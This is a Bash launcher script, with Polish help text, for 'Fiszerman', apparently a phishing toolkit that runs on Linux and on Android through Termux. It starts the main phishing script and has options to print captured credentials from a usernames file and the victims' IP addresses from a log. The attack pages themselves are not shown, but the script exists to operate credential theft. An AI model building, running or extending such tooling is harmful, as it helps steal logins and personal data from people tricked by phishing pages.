#!/bin/bash

# https://github.com/Sztuczka-Magiczka/Fiszerman

if [[ $(uname -o) == *'Android'* ]];then
	FISZERMAN_ROOT="/data/data/com.termux/files/usr/opt/fiszerman"
else
	export FISZERMAN_ROOT="/opt/fiszerman"
fi

if [[ $1 == '-p' || $1 == 'pomoc' ]]; then
	echo "Aby uruchomić narzędzie Fiszerman wpisz \`fiszerman\` w terminalu"
	echo
	echo "Pomoc:"
	echo " -p | pomoc : Wyświetla ten ekran"
	echo " -c | crack : Wyświetla przechwycone dane"
	echo " -i | ip   : Wyświetla adresy IP użytkowników"
	echo
elif [[ $1 == '-c' || $1 == 'crack' ]]; then
	cat $FISZERMAN_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "Nie znaleziono przechwyconych danych !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $FISZERMAN_ROOT/auth/ip.txt 2> /dev/null || {
		echo "Nie znaleziono zapisanych adresów IP !"
		exit 1
	}
else
	cd $FISZERMAN_ROOT
	bash ./fiszerman.sh
fi
